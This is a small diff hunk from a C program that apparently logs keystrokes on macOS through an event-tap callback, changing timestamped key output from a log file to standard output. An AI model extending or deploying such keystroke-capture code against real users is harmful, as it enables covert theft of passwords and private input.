@@ -46,7 +46,7 @@ CGEventRef myCGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRe
     char fmtTime[32];
     strftime(fmtTime, 32, "%F %T", time_info);
     
-    fprintf(logFile, "%s %s\n", fmtTime, keyCodeToReadableString(keyCode));
+    printf("%s %s\n", fmtTime, keyCodeToReadableString(keyCode));
     
     if (counter % 100 == 0) fflush(logFile);
   }
